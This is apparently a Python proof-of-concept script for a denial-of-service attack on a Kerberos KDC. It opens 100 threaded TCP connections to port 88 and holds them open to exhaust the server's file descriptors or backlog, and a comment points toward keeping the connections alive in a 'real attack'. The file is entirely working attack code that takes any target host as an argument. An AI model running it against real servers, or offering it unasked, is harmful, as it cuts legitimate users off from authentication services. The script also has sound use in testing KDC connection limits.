#!/usr/bin/env python3
"""
Proof-of-Concept: TCP Connection Exhaustion on KDC

This script demonstrates a Denial of Service condition where an attacker
opens a large number of TCP connections to a Kerberos KDC (port 88) and
holds them open. If the KDC does not implement proper connection limits
or timeouts, its file descriptor table or backlog can be exhausted,
preventing legitimate clients from connecting.

Reference: RFC 4120, Section 7.2.2
"""

import socket
import sys
import time
import threading

# Configuration
TARGET_HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
TARGET_PORT = 88
NUM_CONNECTIONS = 100  # Number of concurrent connections to hold open
HOLD_TIME = 30         # Seconds to hold connections open

print(f"[*] Target: {TARGET_HOST}:{TARGET_PORT}")
print(f"[*] Opening {NUM_CONNECTIONS} TCP connections and holding for {HOLD_TIME} seconds...")
print(f"[!] Monitor KDC connections with: ss -tnp | grep :{TARGET_PORT}")

def hold_connection(conn_id):
    """Opens a TCP connection and keeps it open until interrupted."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((TARGET_HOST, TARGET_PORT))
        print(f"[+] Connection {conn_id} established.")
        
        # Keep the connection open by reading with a timeout or sleeping
        # In a real attack, we might send minimal valid Kerberos headers to keep it alive,
        # but TCP keep-alive or simply holding the socket is often enough to exhaust FDs.
        sock.settimeout(HOLD_TIME)
        try:
            # Attempt to read; this will block until timeout or server closes
            sock.recv(1024)
        except socket.timeout:
            pass
        except ConnectionResetError:
            print(f"[-] Connection {conn_id} reset by server.")
        finally:
            sock.close()
    except Exception as e:
        print(f"[!] Connection {conn_id} failed: {e}")

# Launch connections in separate threads to avoid blocking
threads = []
for i in range(NUM_CONNECTIONS):
    t = threading.Thread(target=hold_connection, args=(i,))
    t.start()
    threads.append(t)
    time.sleep(0.1)  # Small delay to stagger connections

# Wait for all threads to complete
for t in threads:
    t.join()

print("[*] All connections closed.")
print("[!] If the KDC is vulnerable, you should have observed connection exhaustion.")
print("[!] Legitimate clients may have been unable to connect during the hold period.")
